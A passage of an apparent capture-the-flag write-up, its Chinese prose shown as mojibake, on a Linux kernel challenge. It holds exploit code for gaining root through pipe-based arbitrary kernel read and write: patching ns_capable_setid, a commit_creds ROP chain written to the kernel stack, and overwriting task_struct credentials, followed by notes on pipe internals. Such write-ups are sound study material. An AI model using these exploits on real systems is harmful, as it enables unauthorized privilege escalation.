‡å‡½æ•°ns_capable_setid</p><p>setresuidç³»ç»Ÿè°ƒç”¨ä¸­ä¼šè°ƒç”¨ns_capable_setidåˆ¤æ–­userçš„æƒé™ï¼Œç›´æ¥patch ns_capable_setidä½¿å®ƒæ°¸è¿œreturn trueï¼šï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="hljs-number">0xfff</span>), <br>        <span class="hljs-string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="hljs-comment">/* endbr64 */</span><br>        <span class="hljs-string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="hljs-comment">/* mov rax, 1 */</span><br>        <span class="hljs-string">&quot;\xc3&quot;</span>, <span class="hljs-comment">/* ret */</span><br>        <span class="hljs-number">12</span>);<br></code></pre></td></tr></table></figure></li><li><p>è°ƒç”¨setresuidæ›´æ”¹ç”¨æˆ·idï¼Œææƒæ‹¿shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* get root now :) */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);<br>  <br>sleep(<span class="hljs-number">5</span>);<br>  <br>setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>get_root_shell();<br></code></pre></td></tr></table></figure></li></ul><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>é€šè¿‡task_structæ‰¾å†…æ ¸æ ˆåœ°å€æ‰€åœ¨pageï¼Œç›´æ¥åœ¨å†…æ ¸æ ˆä¸Šå†™ropé“¾</p><ul><li><p>è¿˜æ˜¯è°ƒç”¨pgd_vaddr_resolveè·å–ä¸€äº›åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>], idx = <span class="hljs-number">0</span>; <br><br>redo:<br><br>    <span class="hljs-comment">/* resolving some vaddr */</span><br>    pgd_vaddr_resolve();<br></code></pre></td></tr></table></figure></li><li><p>è·å–stackçš„å†…æ ¸è™šæ‹Ÿåœ°å€ï¼ˆtask_structçš„taskæˆå‘˜å°±æ˜¯å†…æ ¸æ ˆåœ°å€ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);<br>stack_addr_another &amp;= (~PAGE_ATTR_NX); <span class="hljs-comment">/* N/X bit */</span><br>stack_addr_another += page_offset_base;<br>  <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span><br>       <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, stack_addr_another);<br></code></pre></td></tr></table></figure><p>vaddr_resolveå‡½æ•°å’Œvaddr_resolve_for_3_levelå·®ä¸å¤šï¼Œåªæ˜¯å¤šä¸€å±‚è§£æ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> <span class="hljs-title function_">vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pte_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);<br>    pte_val = (buf[PTE_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br><br>    <span class="hljs-keyword">return</span> pte_val;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ„é€ ropé“¾å¹¶å†™åˆ°æ ˆä¸Šï¼Œå°½é‡æŠŠropé“¾å¾€åå†™å‰é¢ç”¨retå¡«å……ï¼Œè¿™æ ·å°±ä¸ç”¨ç®—åç§»äº†ï¼ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* construct the ROP */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ((<span class="hljs-number">0x1000</span> - <span class="hljs-number">8</span> * <span class="hljs-number">11</span>) / <span class="hljs-number">8</span>); i++) &#123;<br>    rop[idx++] = RET + kernel_offset;<br>&#125;<br>  <br>rop[idx++] = POP_RDI_RET + kernel_offset;<br>rop[idx++] = INIT_CRED + kernel_offset;<br>rop[idx++] = COMMIT_CREDS + kernel_offset;<br>rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +<span class="hljs-number">54</span> + kernel_offset;<br>rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>rop[idx++] = (<span class="hljs-type">size_t</span>) get_root_shell;<br>rop[idx++] = user_cs;<br>rop[idx++] = user_rflags;<br>rop[idx++] = user_sp;<br>rop[idx++] = user_ss;<br>  <br>stack_page = direct_map_addr_to_page_addr(stack_addr_another);<br>  <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);<br>  <br>sleep(<span class="hljs-number">5</span>);<br>  <br>arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) stack_page, rop, <span class="hljs-number">0xff0</span>);<br></code></pre></td></tr></table></figure><p>å‡½æ•°å’Œæ ˆåœ°å€ï¼ˆrbpï¼‰ä¸€è§ˆï¼ˆå¥½é•¿çš„è°ƒç”¨é“¾(lllï¿¢Ï‰ï¿¢)ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* task_struct-&gt;stack = 0xffffc900005ff000 */</span><br>entry_SYSCALL_64<span class="hljs-number">0xffffc900005ffff8</span>â†“<br>do_syscall_64<span class="hljs-number">0xffffc900005fff48</span><br>__x64_sys_write<span class="hljs-number">0xffffc900005ffe78</span><br>ksys_write<span class="hljs-number">0xffffc900005ffe68</span><br>vfs_write<span class="hljs-number">0xffffc900005ffe28</span><br>pipe_write<span class="hljs-number">0xffffc900005ffd90</span><br>copy_page_from_iter <span class="hljs-number">0xffffc900005ffce8</span><br>_copy_from_iter<span class="hljs-number">0xffffc900005ffca8</span><br>copyin<span class="hljs-number">0xffffc900005ffc10</span><br>rep_movs_alternative<span class="hljs-number">0xffffc900005ffc10</span><br></code></pre></td></tr></table></figure><p>æ•°æ®å†™å…¥å®é™…ä¸Šå‘ç”Ÿåœ¨rep_movs_alternativeä¸­ï¼Œè¿™ä¸ªå‡½æ•°é€€å‡ºæ—¶å°±å¼€å§‹æ‰§è¡Œè°ƒç”¨é“¾äº†</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack3.png" class title="stack3"></li><li><p><strong>ï¼ï¼ä¸€ä¸ªå°ï¼ˆdaï¼‰æ’æ›²ï¼ï¼</strong></p><p>arttnba3çš„åšå®¢æœ‰æåˆ°ä¼šå‡ºç°ropé“¾å†™å…¥å¤±è´¥ä¸çŸ¥é“å†™åˆ°å“ªå»äº†çš„é—®é¢˜</p><p>è¿™æ˜¯æ³„éœ²çš„å†…æ ¸æ ˆåœ°å€</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack.png" class title="stack"><p>ä½†æ˜¯å†…æ ¸å®é™…ä¸Šä½¿ç”¨çš„æ ˆåœ°å€ï¼ˆä¹Ÿæ˜¯ä¹‹åè¦å†™å…¥ropé“¾çš„æ ˆåœ°å€ï¼‰æ˜¯stack_addr + 0x3000</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack2.png" class title="stack2"><p>arttnba3çš„åŸexpæ˜¯æ³„éœ²task_struct-&gt;stackï¼ˆæŸ¥æ‰¾pgdæ—¶ä¹Ÿæ˜¯æ‰¾çš„è¿™ä¸€é¡µï¼‰ï¼Œåœ¨å†™å…¥çš„æ—¶å€™åœ¨å¯¹åº”é¡µ+ 3 * 0x40</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">pgd_vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    stack_addr = tsk_buf[<span class="hljs-number">4</span>];<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_rop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (stack_page + <span class="hljs-number">0x40</span> * <span class="hljs-number">3</span>), rop, <span class="hljs-number">0xff0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å®æµ‹stackä½¿ç”¨çš„pageä¸ä¸€å®šæ˜¯ç‰©ç†è¿ç»­çš„(Ë‰â–½Ë‰ï¼›)â€¦ï¼Œæ‰€ä»¥ä¼šä¸çŸ¥é“å†™å“ªå»äº†</p><p>æ‰€ä»¥æ›´æ”¹ä¸€ä¸‹æœ€å¼€å§‹çš„stackæ³„éœ²ï¼Œç›´æ¥+ 0x3000ï¼ŒæŸ¥æ‰¾pgdæ—¶ç›´æ¥æŸ¥æ‰¾è¿™ä¸€é¡µï¼Œå†™å…¥ä¹Ÿç›´æ¥å†™å…¥è¿™ä¸€é¡µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">pgd_vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    stack_addr = tsk_buf[<span class="hljs-number">4</span>] + <span class="hljs-number">0x3000</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_rop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) stack_page, rop, <span class="hljs-number">0xff0</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><em>psï¼šå¹²äº†ä»¶å¾ˆsbçš„äº‹å°±æ˜¯æŠŠimgçš„åŒ…é‡æ–°æ‰“åŒ…çš„æ—¶å€™æ‰“æˆcpioäº†ï¼Œmdæ–­ç‚¹çªç„¶æ‰“ä¸ä¸Šäº†è¡€å‹æš´æ¶¨å‘å‡ºå°–é”çš„çˆ†é¸£å£°(â•¯â–”çš¿â–”)â•¯</em></p><h3 id="ä¿®æ”¹cred"><a href="#ä¿®æ”¹cred" class="headerlink" title="ä¿®æ”¹cred"></a>ä¿®æ”¹cred</h3><p>init_credä¸ºæœ‰ç€rootæƒé™çš„credï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å½“å‰è¿›ç¨‹çš„credä¿®æ”¹ä¸ºè¯¥credä»¥å®Œæˆææƒ</p><p>arttnba3çš„expé‡Œæ˜¯ä½¿ç”¨task_struct-&gt;real_parentå‘å‰éå†ç›´åˆ°task_struct-&gt;real_parent &#x3D;&#x3D; &amp;task_structæ¥å¯»æ‰¾initè¿›ç¨‹ï¼ˆæ‰€æœ‰è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ï¼‰çš„task_structæ¥å¯»æ‰¾init_credï¼Œè¿™é“é¢˜æœ‰init_credåœ°å€å°±ä¸éå†äº†ï¼ˆç»å¯¹ä¸æ˜¯å› ä¸ºæˆ‘æ‡’(â€¾â—¡â—)ï¼‰</p><p><em>psï¼šè¿™é‡Œæˆ‘åˆå¹²äº†ä»¶å¾ˆsbçš„äº‹å°±æ˜¯æ‰€æœ‰åœ°å€éƒ½å¤šåŠ äº†ä¸ªkernel_base(Ë‰â–½Ë‰ï¼›)â€¦ï¼ŒğŸ§ é£é£~</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief find the init_task and copy something to current task_struct</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    init_task = kernel_offset + INIT_TASK;<br>    init_cred = kernel_offset + INIT_CRED;<br>    init_nsproxy = kernel_offset + INIT_NSPROXY;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">367</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">368</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">381</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>),<br>                            &amp;buf[<span class="hljs-number">512</span>], <span class="hljs-number">0x100</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    get_root_shell();<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ç§ææƒå¥½åƒåªæ˜¯æœ‰æ¦‚ç‡æˆåŠŸâ€¦â€¦(ãƒ»âˆ€ãƒ»(ãƒ»âˆ€ãƒ»(ãƒ»âˆ€ãƒ»*)</p><p>ç ´æ¡ˆäº†ï¼Œè·Ÿä¸Šé¢ä¸€æ ·çš„é—®é¢˜ï¼Œtask_structæ‰€åœ¨çš„ä¸¤é¡µä¸ä¸€å®šç‰©ç†è¿ç»­ï¼Œæ‰€ä»¥credå¯èƒ½åˆå†™åˆ°åˆ«çš„åœ°æ–¹å»äº†</p><p>æ›´æ”¹åçš„exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief find the init_task and copy something to current task_struct</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    init_task = kernel_offset + INIT_TASK;<br>    init_cred = kernel_offset + INIT_CRED;<br>    init_nsproxy = kernel_offset + INIT_NSPROXY;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br><br>    <span class="hljs-type">size_t</span> current_task_page_1 = direct_map_addr_to_page_addr(current_task + <span class="hljs-number">0x1000</span>);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page_1), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">367</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">368</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">381</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page_1,<br>                            &amp;buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    get_root_shell();<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h1><p><em><strong>ç‰¹åˆ«é¸£è°¢nightuå¸ˆå‚…çš„æŒ‡å¯¼o(*ï¿£â–½ï¿£*)ãƒ–</strong></em></p><h2 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h2><p>pipe_inode_infoç»“æ„ä½“ç”¨äºæè¿°ä¸€ä¸ªpipe</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p>headã€tailï¼šä½¿ç”¨çš„bufsçš„åºå·ï¼Œå¤´å’Œå°¾</p></li><li><p>tmp_pageï¼šä¹‹å‰é‡Šæ”¾çš„pageï¼Œå·²ç»è¯»å®Œæ•°æ®</p></li><li><p>bufsï¼špipe_bufferç»“æ„ä½“æ•°ç»„</p><p>é‡æ¸©ä¸€ä¸‹pipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>pageï¼šæ•°æ®å‚¨å­˜çš„é¡µ</li><li>offsetï¼šreadæŒ‡é’ˆ</li><li>lenï¼šwriteæŒ‡é’ˆ - readæŒ‡é’ˆ</li><li>flagsï¼šä¸€äº›flagï¼Œæ¯”å¦‚èƒ½å¦å¹¶å…¥éfullçš„bufferå°±æ˜¯0x10</li><li>privateï¼šopsä½¿ç”¨çš„private data</li></ul></li></ul><h2 id="tmp-page"><a href="#tmp-page" class="headerlink" title="tmp_page"></a>tmp_page</h2><p>tmp_pageå…¶å®å°±æ˜¯ä¸€ä¸ªpageçš„åå¤‡ï¼Œå¯å­˜ä¸€ä¸ªpageï¼Œåœ¨å‘ä¸€ä¸ªæ–°çš„pipeä¸­writeçš„æ—¶å€™å¦‚æœtmp_pageä¸ä¸ºç©ºåˆ™ä½¿ç”¨tmp_pageçš„pageï¼Œå¦åˆ™ç”³è¯·ä¸€ä¸ªpage</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br><br><span class="hljs-keyword">if</span> (!page) &#123;<br>page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);<br><span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>ret = ret ? : -ENOMEM;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pipe-&gt;tmp_page = page;<br>&#125;<br><br><br><br><span class="hljs-comment">/* Insert it into the buffer array */</span><br>buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>buf-&gt;page = page;<br>buf-&gt;ops = &amp;anon_pipe_buf_ops;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (is_packetized(filp))<br>buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br><span class="hljs-keyword">else</span><br>buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br><br>copied = copy_page_from_iter(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<br></code></pre></td></tr></table></figure><p>åœ¨pipe_readä¸­ï¼Œå¦‚æœä¸€ä¸ªbufä¸­çš„æ•°æ®è¢«è¯»å®Œäº†ï¼Œè°ƒç”¨pipe_buf_release</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!buf-&gt;len) &#123;<br>pipe_buf_release(pipe, buf);<br>spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br>tail++;<br>pipe-&gt;tail = tail;<br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br>&#125;<br></code></pre></td></tr></table></figure><p>pipe_buf_releaseå›å…ˆå°†pipe_bufferçš„opsç½®ç©ºï¼Œå†è°ƒç”¨å¯¹åº”çš„releaseå‡½æ•°ï¼Œè¿™é‡Œæ˜¯anon_pipe_buf_release</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span 